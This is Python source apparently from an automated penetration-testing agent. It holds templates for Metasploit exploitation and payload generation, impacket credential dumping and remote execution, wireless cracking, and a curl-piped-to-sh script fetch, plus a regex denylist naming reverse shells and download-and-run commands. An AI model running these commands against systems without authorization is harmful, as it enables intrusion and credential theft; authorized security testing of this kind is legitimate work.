import json
import os
import re
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field

from constants import C, ICO
from config import CONFIG, CONFIG_DIR, load_config
from logging_utils import log, swallow as _swallow


# ===================== TOOL REGISTRY =====================

TOOLS = {
     # Port scanning
     "nmap_quick": "nmap -sV -sC --top-ports 1000 {target} | Quick port scan (top 1000, service detection) | 180",
     "nmap_full": "nmap -sV -sC -p- {target} | Full port scan (all 65535) | 600",
     "nmap_vuln": "nmap -sV --script vuln {target} | Vulnerability scan via NSE | 300",
     "nmap_os": "nmap -O --osscan-guess {target} | OS fingerprinting | 180",
     "masscan": "masscan {target} -p1-65535 --rate=1000 2>/dev/null | Fast full-port scan | 120",
     "rustscan": "rustscan -a {target} --ulimit 5000 2>/dev/null | Rust-based port scanner | 120",
     # Web enumeration
     "gobuster": "gobuster dir -u http://{target} -w {wordlist_dir}/dirb/common.txt -q -t 20 | Web directory brute force | 120",
     "ffuf": "ffuf -u http://{target}/FUZZ -w {wordlist_dir}/dirb/common.txt -mc 200,301,302 -t 50 | Fast web fuzzer | 120",
     # "nikto": "nikto -h http://{target} -ssl -Format txt -nointeractive | Web vulnerability scanner | 180",  # permanently disabled — always times out
     "whatweb": "whatweb -a 3 {target} 2>/dev/null | Web technology fingerprinting | 60",
     "waf_detect": "nmap --script http-waf-detect -p 80,443 {target} | WAF detection | 60",
     "dirsearch": "dirsearch -u http://{target} -e php,html,js,json,txt -x 400,403,404 -t 20 | Directory discovery | 180",
     # Burp Suite
     "burp": "burpsuite --headless --unprivileged --tmp-dir {tmp_dir}/burp --collaborator-server http://{collaborator_burp}:{collaborator_port} --scan --scan-check-for-update=false --scope-url-suffix={target} --report-format=html --report-file={tmp_dir}/burp_report_{target}.html | Burp Suite automated scanning | 300",
     # Subdomain enumeration
     "amass": "amass enum -passive -d {target} 2>/dev/null | Amass passive subdomain enum | 120",
     "subfinder": "subfinder -d {target} -silent 2>/dev/null | Subfinder subdomain discovery | 120",
     "assetfinder": "assetfinder {target} 2>/dev/null | Asset discovery | 60",
     "findomain": "findomain -t {target} 2>/dev/null | Fast subdomain finder | 60",
     # Vulnerability scanning
     "nuclei": "nuclei -u http://{target} -t cves,misconfigurations,exposures -silent 2>/dev/null | Nuclei vulnerability scanner | 300",
     "nuclei_templates": "nuclei -u http://{target} -t ~/nuclei-templates/ -rl 50 -silent | Full nuclei scan with templates | 600",
     "jaeles": "jaeles scan -u http://{target} 2>/dev/null | Web application scanner | 180",
     # SMB/Windows
     "enum4linux": "enum4linux -a {target} 2>/dev/null | SMB/NetBIOS enumeration | 120",
     "smb_enum": "smbclient -L \\\\{target} -N -t 5 2>/dev/null | SMB share listing | 30",
     "smbmap": "smbmap -H {target} -u '' 2>/dev/null | SMB share enumeration | 60",
     "crackmapexec": "crackmapexec smb {target} -u '' -p '' --shares 2>/dev/null | CME SMB enumeration | 60",
     # SSH
     "ssh_scan": "nmap -sV --script ssh2-enum-algos,ssh-hostkey -p 22 {target} | SSH algorithm audit | 60",
     "ssh_audit": "python3 -c \"from ssh_audit import ssh_audit; ssh_audit.main(['{target}'])\" 2>/dev/null | SSH security audit | 60",
     # DNS
     "dns_enum": "nmap --script dns-brute -p 53 {target} 2>/dev/null | DNS brute force | 60",
     "dnsrecon": "dnsrecon -d {target} 2>/dev/null | DNS reconnaissance | 60",
     "dnsx": "echo '{target}' | dnsx -a -resp -silent 2>/dev/null | DNSX enumeration | 60",
     # SNMP
     "snmp_walk": "snmpwalk -v2c -c public {target} 2>/dev/null || snmpwalk -v1 -c public {target} 2>/dev/null | SNMP walk | 60",
     "snmpcheck": "snmpcheck -c public {target} 2>/dev/null | SNMP enumeration | 60",
     # SSL/TLS
     "ssl_scan": "nmap --script ssl-enum-ciphers -p 443 {target} | SSL/TLS cipher audit | 60",
     "testssl": "testssl.sh {target}:443 2>/dev/null | TLS/SSL security testing | 300",
     # RDP
     "rdp_scan": "nmap -sV --script rdp-sec-check -p 3389 {target} | RDP security check | 60",
     # FTP
     "ftp_enum": "nmap -sV --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 {target} | FTP vuln scan | 60",
     "ftp_anon": "nmap -sV --script ftp-anon -p 21 {target} 2>/dev/null | FTP anonymous check | 30",
     # LDAP/Active Directory
     "ldap_enum": "nmap -sV --script ldap-rootdse -p 389 {target} | LDAP enum | 60",
     "ad_enum": "ldapsearch -x -h {target} -b '' -s base '(objectclass=*)' 2>/dev/null | Active Directory enum | 60",
     # Database
     "mysql_enum": "nmap -sV --script mysql-info,mysql-users,mysql-databases -p 3306 {target} | MySQL enumeration | 60",
     "mongo_enum": "nmap -sV --script mongodb-info -p 27017 {target} | MongoDB enumeration | 60",
     # Exploit search
     "searchsploit": "searchsploit {query} 2>/dev/null | head -40 | ExploitDB search | 30",
     "sploitus": "curl -s 'https://sploitus.com/search?q={query}' | grep -oP '(?<=<a href=\"/exploit/)\"[^\"]*' | head -10 | Online exploit search | 30",
     # Advanced bug-bounty modules (short form)
     "sqlmap": "sqlmap -u http://{target} --batch --random-agent --level 2 --risk 2 --time-sec 5 2>/dev/null | SQL injection test | 180",
     # Web application testing
     "xsser": "xsser --url=http://{target} --auto | XSS testing | 120",
     "xsstrike": "xsstrike -u http://{target} --crawl | Advanced XSS detection | 180",
     "commix": "commix --url=http://{target} --batch | Command injection testing | 180",
     "dalfox": "dalfox url http://{target} | Advanced XSS scanner with DOM verification | 180",
     "gospider": "gospider -s http://{target} -d 3 -c 10 2>/dev/null | Fast web crawler/spider | 120",
     "arjun": "arjun -u http://{target} 2>/dev/null | HTTP hidden-parameter discovery | 120",
     "kiterunner": "kr scan http://{target} -w {wordlist_dir}/routes-large.kite 2>/dev/null | API route/endpoint discovery | 300",
     # CMS
     "wpscan": "wpscan --url http://{target} --no-update 2>/dev/null | WordPress vulnerability scan | 180",
     "joomscan": "joomscan --url http://{target} | Joomla vulnerability scanning | 120",
     "droopescan": "droopescan scan drupal -u http://{target} | Drupal vulnerability scanning | 180",
     # Network
     "httpx": "httpx -s -port -title -content-length -web-server -tech-detect -l {target} 2>/dev/null | HTTPX alive check | 60",
     "katana": "katana -u http://{target} -silent -jc 2>/dev/null | Katana crawling | 120",
     # Cloud
     "cloud_metadata": "curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null | AWS metadata check | 10",
     # Mobile
     "apktool": "apktool d -f -o {tmp_dir}/x19_apk {target} | Decompile APK (manifest, resources, smali) | 120",
     "jadx": "jadx -d {tmp_dir}/x19_jadx {target} | Decompile APK/DEX to readable Java source | 180",
     "apkleaks": "apkleaks -f {target} | Scan APK for secrets, endpoints, URIs | 120",
     # Privesc
     "linpeas": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | Linux privesc enumeration (PEASS-ng) | 300",
     "winpeas": "winpeas.exe | Windows privesc enumeration (PEASS-ng) | 300",
     "suid_find": "find / -perm -4000 -type f 2>/dev/null | Find SUID binaries for privesc | 60",
     # AD
     "netexec": "netexec smb {target} -u '{user}' -p '{password}' --shares | NetExec (CME successor) SMB enum | 60",
     "kerbrute": "kerbrute userenum -d {target} --dc {target} {wordlist_dir}/users.txt | Kerberos user enumeration | 120",
     "certipy": "certipy find -u {user}@{target} -p {password} -dc-ip {target} -vulnerable | AD CS (ESC1-8) misconfig finder | 180",
     # Containers
     "trivy": "trivy image {target} | Container image vulnerability + secret scan | 300",
     "kube_hunter": "kube-hunter --remote {target} | Kubernetes attack-surface scanner | 300",
     # Reporting
     "dr-header": "dr_header -u http://{target} | HTTP headers analysis | 30",
      "whatportis": "whatportis {port} | Port service lookup | 10",

     # ---- METASPLOIT ----
     "msfconsole": "msfconsole -q -x 'use {exploit}; set RHOSTS {target}; set RPORT {port}; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit' 2>/dev/null | Metasploit exploit execution | 300",
     "msfvenom": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {tmp_dir}/payload.exe 2>/dev/null | Payload generation via msfvenom | 60",
     "msf_scan": "msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set THREADS 50; run; exit' 2>/dev/null | Metasploit port scanner | 120",
     # ---- IMPACKET ----
     "secretsdump": "impacket-secretsdump -just-dc-ntlm {domain}/{user}:{password}@{target} 2>/dev/null | DCSync / NTLM hash dump | 180",
     "GetNPUsers": "impacket-GetNPUsers -dc-ip {target} -request {domain}/{user}:{password} 2>/dev/null | AS-REP roasting (Kerberos pre-auth disabled) | 60",
     "GetUserSPNs": "impacket-GetUserSPNs -dc-ip {target} {domain}/{user}:{password} -request 2>/dev/null | Kerberoasting (request TGS hashes) | 120",
     "smbexec": "impacket-smbexec {domain}/{user}:{password}@{target} 2>/dev/null | SMB remote command execution | 60",
     "wmiexec": "impacket-wmiexec {domain}/{user}:{password}@{target} 2>/dev/null | WMI remote command execution | 60",
     "psexec": "impacket-psexec {domain}/{user}:{password}@{target} 2>/dev/null | PsExec-style remote execution | 60",
     # ---- ACTIVE DIRECTORY / BLOODHOUND ----
     "bloodhound": "bloodhound-python -d {domain} -u {user} -p {password} -dc {target} -c All -ns {target} --dns-timeout 5 2>/dev/null | BloodHound AD collector (ingestor) | 180",
     # ---- WIRELESS ----
     "airodump": "airodump-ng {interface} --write {tmp_dir}/capture 2>/dev/null | 802.11 packet capture | 60",
     "aircrack": "aircrack-ng {tmp_dir}/capture-01.cap -w {wordlist} 2>/dev/null | WPA/WEP key cracking | 300",
     "reaver": "reaver -i {interface} -b {bssid} -vv 2>/dev/null | WPS PIN brute force attack | 300",
     # ---- GIT / SUPPLY CHAIN ----
     "git_dumper": "git-dumper http://{target}/.git/ {tmp_dir}/git_dump 2>/dev/null | Dump exposed .git repository | 60",
     "trufflehog": "trufflehog filesystem {target} --no-update 2>/dev/null | High-entropy secret scanning | 120",
     "gitleaks": "gitleaks detect --source {target} --no-color 2>/dev/null | Git secret leak detection | 120",
     # ---- OSINT / DISCOVERY ----
     "theHarvester": "theHarvester -d {target} -b all -f {tmp_dir}/harvester.html 2>/dev/null | Email/subdomain/employee OSINT gathering | 180",
 }


class ToolResult:
    def __init__(self, stdout: str, stderr: str, returncode: int, error: Optional[str] = None):
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode
        self.error = error

    @staticmethod
    def from_mcp(mcp_result) -> "ToolResult":
        if mcp_result.success:
            texts = [c.get("text", "") for c in mcp_result.content if c.get("type") == "text"]
            return ToolResult("\n".join(texts), "", 0)
        err = mcp_result.error or "MCP error"
        return ToolResult("", err, -1, err)

    @property
    def ok(self) -> bool:
        return self.returncode == 0 and not self.error

    @property
    def text(self) -> str:
        parts = []
        if self.stdout: parts.append(self.stdout)
        if self.stderr: parts.append(f"[STDERR] {self.stderr}")
        if self.error: parts.append(f"[ERROR] {self.error}")
        return "\n".join(parts)

    def to_dict(self) -> dict:
        """Structured, JSON-serializable tool result."""
        return {"ok": self.ok, "returncode": self.returncode, "error": self.error,
                "stdout": self.stdout, "stderr": self.stderr,
                "stdout_len": len(self.stdout or ""), "stderr_len": len(self.stderr or "")}

    def to_json(self) -> str:
        return json.dumps(self.to_dict())


class BrowserAutomation:
    """Headless-browser automation (Selenium + Chrome) for JS-rendered recon: DOM, links/forms, screenshots.
    Selenium is optional — every action returns {'error': ...} with an install hint when it is unavailable."""

    def __init__(self, headless: bool = True, timeout: int = 30):
        self.headless = headless
        self.timeout = timeout

    def _run(self, fn) -> dict:
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
        except ImportError:
            return {"error": "selenium not installed — run: pip install selenium (and have Chrome installed)"}
        opts = Options()
        if self.headless:
            opts.add_argument("--headless=new")
        for a in ("--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--window-size=1366,900"):
            opts.add_argument(a)
        try:
            d = webdriver.Chrome(options=opts)  # selenium>=4.6 auto-resolves the driver
        except Exception as e:
            return {"error": f"browser launch failed (need Chrome + selenium>=4.6): {e}"}
        try:
            d.set_page_load_timeout(self.timeout)
            return fn(d)
        except Exception as e:
            return {"error": f"navigation failed: {e}"}
        finally:
            try:
                d.quit()
            except Exception as e:
                _swallow(e)

    def render(self, url: str) -> dict:
        def f(d):
            d.get(url)
            return {"url": url, "title": d.title, "html": d.page_source[:20000]}
        return self._run(f)

    def forms(self, url: str) -> dict:
        def f(d):
            from selenium.webdriver.common.by import By
            d.get(url)
            links = sorted({a.get_attribute("href") for a in d.find_elements(By.TAG_NAME, "a")
                            if a.get_attribute("href")})
            forms = []
            for fm in d.find_elements(By.TAG_NAME, "form"):
                inputs = [{"name": i.get_attribute("name"), "type": i.get_attribute("type")}
                          for i in fm.find_elements(By.TAG_NAME, "input")]
                forms.append({"action": fm.get_attribute("action"),
                              "method": (fm.get_attribute("method") or "get").lower(), "inputs": inputs})
            return {"url": url, "title": d.title, "links": links[:200], "forms": forms}
        return self._run(f)

    def screenshot(self, url: str, path: str = "") -> dict:
        def f(d):
            d.get(url)
            out = path or str(Path(CONFIG.WORKSPACE) / f"shot_{re.sub(r'[^a-zA-Z0-9]+', '_', url)[:60]}.png")
            d.save_screenshot(out)
            return {"url": url, "screenshot": out}
        return self._run(f)


class BrowserCrawler:
    """Authenticated browser crawler for JS-heavy / SPA targets.
    Uses Playwright (preferred) when available, falls back to Selenium.
    Persistent cookies — login once, all subsequent requests share the session.
    Captures: links, forms, XHR/fetch URLs, dynamic content, shadow DOM endpoints.
    Returns endpoint list + cookie jar for reuse by other tools."""

    def __init__(self, headless: bool = True, timeout: int = 30, max_depth: int = 3, max_pages: int = 50):
        self.headless = headless
        self.timeout = timeout
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.cookie_jar: List[dict] = []
        self.visited: set = set()
        self.endpoints: List[str] = []
        self.forms: List[dict] = []
        self.captured_requests: List[dict] = []  # XHR/fetch URLs seen
        self._mode: str = "uninit"  # "playwright" | "selenium" | "unavailable"

    def _init(self) -> Tuple[bool, str]:
        if self._mode != "uninit":
            return self._mode != "unavailable", self._mode
        try:
            from playwright.sync_api import sync_playwright  # noqa
            self._mode = "playwright"
            return True, "playwright"
        except ImportError:
            pass
        try:
            from selenium import webdriver  # noqa
            self._mode = "selenium"
            return True, "selenium"
        except ImportError:
            self._mode = "unavailable"
            return False, "install playwright (pip install playwright && playwright install chromium) or selenium"

    def login(self, login_url: str, username: str, password: str, username_sel: str = "input[name='username']",
              password_sel: str = "input[name='password']", submit_sel: str = "button[type='submit']",
              post_login_url_indicator: str = "") -> Tuple[bool, str]:
        """Open the login page, fill credentials, submit, return cookies for reuse.
        post_login_url_indicator: if non-empty, wait until current URL contains this string
        before considering login successful."""
        ok, mode = self._init()
        if not ok:
            return False, mode
        try:
            if mode == "playwright":
                return self._login_playwright(login_url, username, password, username_sel, password_sel, submit_sel, post_login_url_indicator)
            return self._login_selenium(login_url, username, password, username_sel, password_sel, submit_sel, post_login_url_indicator)
        except Exception as e:
            return False, f"login error: {e}"

    def _login_playwright(self, login_url, username, password, us, ps, ss, indicator):
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=self.headless,
                                        args=["--no-sandbox", "--disable-dev-shm-usage"])
            ctx = browser.new_context()
            page = ctx.new_page()
            try:
                page.goto(login_url, timeout=self.timeout * 1000)
                page.fill(us, username)
                page.fill(ps, password)
                page.click(ss)
                if indicator:
                    page.wait_for_url(f"**{indicator}**", timeout=self.timeout * 1000)
                else:
                    page.wait_for_load_state("networkidle", timeout=self.timeout * 1000)
                self.cookie_jar = [{"name": c["name"], "value": c["value"],
                                    "domain": c["domain"], "path": c["path"]} for c in ctx.cookies()]
                return True, f"login ok, {len(self.cookie_jar)} cookies captured"
            finally:
                browser.close()

    def _login_selenium(self, login_url, username, password, us, ps, ss, indicator):
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        opts = Options()
        if self.headless:
            opts.add_argument("--headless=new")
        for a in ("--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"):
            opts.add_argument(a)
        d = webdriver.Chrome(options=opts)
        try:
            d.set_page_load_timeout(self.timeout)
            d.get(login_url)
            d.find_element(By.CSS_SELECTOR, us).send_keys(username)
            d.find_element(By.CSS_SELECTOR, ps).send_keys(password)
            d.find_element(By.CSS_SELECTOR, ss).click()
            if indicator:
                import time as _t
                _t.sleep(2)
                if indicator not in d.current_url:
                    return False, f"login did not redirect to indicator URL (now at {d.current_url})"
            else:
                d.execute_script("return document.readyState")  # noop, just a beat
            self.cookie_jar = [{"name": c["name"], "value": c["value"]}
                               for c in d.get_cookies()]
            return True, f"login ok, {len(self.cookie_jar)} cookies captured"
        finally:
            d.quit()

    def crawl(self, start_url: str, same_origin_only: bool = True) -> dict:
        """Crawl starting from start_url using captured cookies. Returns a summary dict."""
        ok, mode = self._init()
        if not ok:
            return {"error": mode, "endpoints": [], "forms": [], "requests": []}
        try:
            if mode == "playwright":
                return self._crawl_playwright(start_url, same_origin_only)
            return self._crawl_selenium(start_url, same_origin_only)
        except Exception as e:
            return {"error": f"crawl error: {e}", "endpoints": self.endpoints,
                    "forms": self.forms, "requests": self.captured_requests}

    def _crawl_playwright(self, start_url, same_origin_only):
        from playwright.sync_api import sync_playwright
        from urllib.parse import urlparse, urljoin
        from collections import deque
        start = urlparse(start_url)
        origin = f"{start.scheme}://{start.netloc}"
        queue = deque([(start_url, 0)])
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=self.headless,
                                        args=["--no-sandbox", "--disable-dev-shm-usage"])
            ctx = browser.new_context()
            if self.cookie_jar:
                ctx.add_cookies([{"name": c["name"], "value": c["value"],
                                  "domain": c["domain"], "path": c.get("path", "/")}
                                 for c in self.cookie_jar if c.get("domain")])
            # Capture XHR/fetch URLs
            def on_request(req):
                if req.resource_type in ("xhr", "fetch", "websocket"):
                    self.captured_requests.append({"url": req.url, "method": req.method})
            ctx.on("request", on_request)
            page = ctx.new_page()
            try:
                while queue and len(self.visited) < self.max_pages:
                    url, depth = queue.popleft()
                    if url in self.visited:
                        continue
                    self.visited.add(url)
                    try:
                        page.goto(url, timeout=self.timeout * 1000, wait_until="domcontentloaded")
                        # Wait briefly for SPA hydration
                        try:
                            page.wait_for_load_state("networkidle", timeout=5000)
                        except Exception:
                            pass
                    except Exception as e:
                        log(f"[BrowserCrawler] {url} -> {e}")
                        continue
                    # Collect forms
                    try:
                        from playwright.sync_api import TimeoutError as PWTimeout
                        for fm in page.query_selector_all("form"):
                            action = fm.get_attribute("action") or url
                            inputs = [{"name": i.get_attribute("name"), "type": i.get_attribute("type")}
                                      for i in fm.query_selector_all("input,textarea,select")
                                      if i.get_attribute("name")]
                            self.forms.append({"page": url, "action": urljoin(url, action), "inputs": inputs})
                    except Exception:
                        _swallow(e)
                    # Collect links
                    try:
                        for a in page.query_selector_all("a[href]"):
                            href = a.get_attribute("href")
                            if not href or href.startswith(("#", "javascript:", "mailto:")):
                                continue
                            full = urljoin(url, href)
                            self.endpoints.append(full)
                            if same_origin_only and urlparse(full).netloc != start.netloc:
                                continue
                            if depth < self.max_depth and full not in self.visited:
                                queue.append((full, depth + 1))
                    except Exception:
                        _swallow(e)
                return {"endpoints": sorted(set(self.endpoints))[:500],
                        "forms": self.forms[:200],
                        "requests": self.captured_requests[:500],
                        "pages_visited": len(self.visited)}
            finally:
                browser.close()

    def _crawl_selenium(self, start_url, same_origin_only):
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from urllib.parse import urljoin, urlparse
        from collections import deque
        start = urlparse(start_url)
        opts = Options()
        if self.headless:
            opts.add_argument("--headless=new")
        for a in ("--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"):
            opts.add_argument(a)
        d = webdriver.Chrome(options=opts)
        try:
            d.set_page_load_timeout(self.timeout)
            if self.cookie_jar:
                for c in self.cookie_jar:
                    try:
                        d.add_cookie({"name": c["name"], "value": c["value"]})
                    except Exception:
                        pass
            queue = deque([(start_url, 0)])
            while queue and len(self.visited) < self.max_pages:
                url, depth = queue.popleft()
                if url in self.visited:
                    continue
                self.visited.add(url)
                try:
                    d.get(url)
                except Exception as e:
                    log(f"[BrowserCrawler] {url} -> {e}")
                    continue
                # Forms
                for fm in d.find_elements(By.TAG_NAME, "form"):
                    action = fm.get_attribute("action") or url
                    inputs = [{"name": i.get_attribute("name"), "type": i.get_attribute("type")}
                              for i in fm.find_elements(By.TAG_NAME, "input")
                              if i.get_attribute("name")]
                    self.forms.append({"page": url, "action": urljoin(url, action), "inputs": inputs})
                # Links
                for a in d.find_elements(By.CSS_SELECTOR, "a[href]"):
                    href = a.get_attribute("href")
                    if not href or href.startswith(("#", "javascript:", "mailto:")):
                        continue
                    full = urljoin(url, href)
                    self.endpoints.append(full)
                    if same_origin_only and urlparse(full).netloc != start.netloc:
                        continue
                    if depth < self.max_depth and full not in self.visited:
                        queue.append((full, depth + 1))
            return {"endpoints": sorted(set(self.endpoints))[:500],
                    "forms": self.forms[:200],
                    "requests": self.captured_requests[:500],
                    "pages_visited": len(self.visited)}
        finally:
            d.quit()

    def cookie_header(self) -> str:
        """Return cookies as a Cookie: header value (for use with curl/requests)."""
        return "; ".join(f"{c['name']}={c['value']}" for c in self.cookie_jar)


class ToolExecutor:
    # ---- Shell command denylist (safety) ----
    # Patterns that match → command is REFUSED before subprocess.run() ever sees it.
    # Covers: filesystem wipe, kernel/reboot, network flush, fork bomb, exfil-to-shell,
    # outbound to non-allowlisted hosts, privilege escalation, container escape.
    BLOCKED = [
        # Filesystem destruction
        r'^\s*rm\s+-rf\s+/', r'^\s*rm\s+-rf\s+~', r'^\s*rm\s+-rf\s+\$HOME',
        r'^\s*mkfs\.', r'^\s*dd\s+if=.+of=/dev/(sd|nvme|hd)', r'^\s*format\s',
        r'^\s*> /dev/sd', r'^\s*> /dev/nvme', r'^\s*> /dev/hd',
        r'^\s*shred\s+/dev/',
        # System control
        r'^\s*reboot', r'^\s*shutdown', r'^\s*poweroff', r'^\s*halt', r'^\s*init\s+[06]',
        r'^\s*systemctl\s+(poweroff|reboot|halt)',
        # Network destruction
        r'^\s*iptables\s+-F', r'^\s*iptables\s+--flush', r'^\s*ufw\s+disable',
        r'^\s*ip\s+link\s+delete', r'^\s*ifconfig\s+.+\s+down',
        # Fork bomb
        r'^\s*:\(\)\s*\{', r'^\s*while\s+true\s*;\s*do', r'^\s*yes\s*\|',
        # Exfil / remote shell (curl|sh, wget|sh, nc reverse)
        r'curl\s+[^|]*\|\s*(sh|bash|zsh|ksh|python|python3|perl|ruby)\b',
        r'wget\s+[^|]*\|\s*(sh|bash|zsh|ksh|python|python3|perl|ruby)\b',
        r'curl\s+[^|]*-o\s+/tmp/[a-z0-9_-]+\s*;?\s*(chmod|sh|bash)',
        # Reverse shell payloads piped into bash
        r'bash\s+-i\s+>&\s*/dev/tcp/',
        r'sh\s+-i\s+>&\s*/dev/tcp/',
        # chmod 777 on system dirs
        r'chmod\s+(-R\s+)?777\s+/(etc|usr|var|bin|sbin|boot|root)',
        # chown root on system dirs
        r'chown\s+(-R\s+)?root\s+/(etc|usr|var|bin|sbin|boot)',
        # Crypto / ransomware patterns (encrypting user files)
        r'\bopenssl\s+enc\s+-.*-pass\b.*-in\s+/home',
        r'\bgpg\s+.*--symmetric\s+.*-o\s+/home',
        # Outbound exfil to non-allowlisted hosts via netcat
        r'\bnc\s+[^|]+\s+-e\s+/(bin/bash|bin/sh)',
        # Privilege escalation direct
        r'\bsudo\s+su\b', r'\bsudo\s+-i\b', r'\bsu\s+-\s*root\b',
    ]

    def __init__(self, workspace: str, mcp_client=None):
        self.workspace = Path(workspace)
        self.workspace.mkdir(parents=True, exist_ok=True)
        self.mcp_client = mcp_client

    def run(self, command: str, timeout: int = 120) -> ToolResult:
        if not command or not command.strip():
            return ToolResult("", "", 0)
        for pat in self.BLOCKED:
            if re.match(pat, command.strip()):
                log(f"BLOCKED: {command}")
                return ToolResult("", "Blocked: destructive command", -1, "blocked")

        # Shell syntax validation (cross-platform basic parsing + bash -n on Unix).
        import shlex
        try:
            shlex.split(command)
        except ValueError as e:
            err = str(e)
            log(f"[TOOL_SYNTAX_REJECT] {command[:120]} :: {err}")
            return ToolResult("", f"Rejected (shell syntax error): {err}", -1, "syntax_error")

        import shutil
        bash_path = None
        if os.name != "nt":
            bash_path = shutil.which("bash")
            if bash_path:
                chk = subprocess.run([bash_path, "-n", "-c", command], capture_output=True, text=True, errors="replace")
                if chk.returncode != 0:
                    err = (chk.stderr or "shell syntax error").strip()
                    log(f"[TOOL_SYNTAX_REJECT] {command[:120]} :: {err}")
                    return ToolResult("", f"Rejected (shell syntax error): {err}", -1, "syntax_error")

        mcp_server_name = CONFIG.MCP_KALI_SERVER
        if not mcp_server_name and self.mcp_client:
            for sname, srv in getattr(self.mcp_client, "_servers", {}).items():
                if "kali" in sname.lower():
                    mcp_server_name = sname
                    break
        if mcp_server_name and self.mcp_client:
            srv = self.mcp_client.get_server(mcp_server_name)
            if srv and srv.connected and "execute_command" in srv._tools:
                log(f"[TOOL_MCP] Routing through Kali MCP ({mcp_server_name}): {command[:120]}")
                print(f"{C.M}[Kali] {command[:250]}{C.N}")
                result = srv.call_tool("execute_command", {"command": command, "timeout": timeout})
                if result.success:
                    texts = [c.get("text", "") for c in result.content if c.get("type") == "text"]
                    output = "\n".join(texts)
                    print(f"{C.G}{output[:2500]}{C.N}")
                    print(f"{C.B}[*] Exit: 0{C.N}")
                    return ToolResult(output, "", 0)
                err_texts = [c.get("text", "") for c in result.content if c.get("type") == "text"]
                err_out = "\n".join(err_texts) if err_texts else (result.error or "MCP error")
                print(f"{C.R}{err_out[:1200]}{C.N}")
                print(f"{C.B}[*] Exit: -1{C.N}")
                return ToolResult("", err_out, -1, result.error)

        log(f"[TOOL_START] {command} (timeout={timeout}s cwd={self.workspace})")
        print(f"{C.Y}[*] {command[:250]}{C.N}")

        try:
            kwargs = dict(
                shell=True,
                capture_output=True,
                text=False,
                timeout=timeout,
                cwd=str(self.workspace),
                stdin=subprocess.DEVNULL,
            )
            # Only set executable when bash exists (never pass executable=None).
            if bash_path:
                kwargs["executable"] = bash_path

            r = subprocess.run(command, **kwargs)
            so = r.stdout.decode("utf-8", errors="replace") if r.stdout else ""
            se = r.stderr.decode("utf-8", errors="replace") if r.stderr else ""
            out = ToolResult(so, se, r.returncode)
            log(f"[TOOL_EXIT] rc={r.returncode} cmd={command[:120]}")
            log(f"[TOOL_STDOUT] {len(so)}B: {so[:500]}")
            log(f"[TOOL_STDERR] {len(se)}B: {se[:500]}")
            if so: print(f"{C.G}{so[:2500]}{C.N}")
            if se: print(f"{C.R}{se[:1200]}{C.N}")
            print(f"{C.B}[*] Exit: {r.returncode}{C.N}")
            return out
        except subprocess.TimeoutExpired:
            log(f"[TOOL_EXIT] TIMEOUT after {timeout}s: {command}")
            return ToolResult("", f"Timeout ({timeout}s)", -1, "timeout")
        except Exception as e:
            log(f"[TOOL_EXIT] ERROR: {e}")
            return ToolResult("", str(e), -1, str(e))

    def resolve_tool(self, tool_name: str, target: str, **kwargs) -> Tuple[str, str, int]:
        raw = TOOLS.get(tool_name, "")
        if not raw:
            return "echo 'unknown tool'", f"Tool '{tool_name}' not found", 10
        parts = raw.rsplit("|", 2)
        cmd_template = parts[0].strip()
        desc = parts[1].strip() if len(parts) > 1 else ""
        timeout = 120
        if len(parts) > 2:
            try:
                timeout = int(parts[2].strip())
            except ValueError:
                pass
        # Format the command with provided kwargs, defaulting target
        format_kwargs = {"target": target}
        format_kwargs.update(kwargs)
        
        # Keep trying to format until all missing keys are resolved
        max_attempts = 20  # Prevent infinite loop
        sensitive = {"target", "rhost"}
        cmd = cmd_template  # always defined, even if formatting never succeeds
        for attempt in range(max_attempts):
            try:
                cmd = cmd_template.format(**format_kwargs)
                break  # Success!
            except (ValueError, IndexError) as e:
                log(f"[resolve_tool] non-key format error in '{tool_name}': {e}")
                break
            except KeyError as e:
                # If a required placeholder is missing, provide a sensible default or error
                missing_key = str(e).strip("'")
                if missing_key == "wordlist_dir":
                    format_kwargs["wordlist_dir"] = CONFIG.WORDLIST_DIR
                elif missing_key == "tmp_dir":
                    format_kwargs["tmp_dir"] = CONFIG.TMP_DIR
                elif missing_key == "interface":
                    format_kwargs["interface"] = CONFIG.INTERFACE
                elif missing_key == "capture_file":
                    format_kwargs["capture_file"] = f"{CONFIG.TMP_DIR}/capture.cap"
                elif missing_key == "memory_file":
                    format_kwargs["memory_file"] = f"{CONFIG.TMP_DIR}/memory.dmp"
                elif missing_key == "hash_file":
                    format_kwargs["hash_file"] = f"{CONFIG.TMP_DIR}/hash.txt"
                elif missing_key == "file":
                    format_kwargs["file"] = f"{CONFIG.TMP_DIR}/testfile"
                elif missing_key == "output_file":
                    format_kwargs["output_file"] = f"{CONFIG.TMP_DIR}/output.txt"
                elif missing_key == "output_dir":
                    format_kwargs["output_dir"] = f"{CONFIG.TMP_DIR}/output"
                elif missing_key == "wordlist_file":
                    format_kwargs["wordlist_file"] = f"{CONFIG.WORDLIST_DIR}/rockyou.txt"
                elif missing_key == "resolvers_file":
                    format_kwargs["resolvers_file"] = f"{CONFIG.WORDLIST_DIR}/dns/resolvers.txt"
                elif missing_key == "subdomains_file":
                    format_kwargs["subdomains_file"] = f"{CONFIG.TMP_DIR}/subdomains.txt"
                elif missing_key == "wordlist":
                    format_kwargs["wordlist"] = f"{CONFIG.WORDLIST_DIR}/rockyou.txt"
                elif missing_key == "rules_path":
                    format_kwargs["rules_path"] = f"{CONFIG.TMP_DIR}/yara-rules"
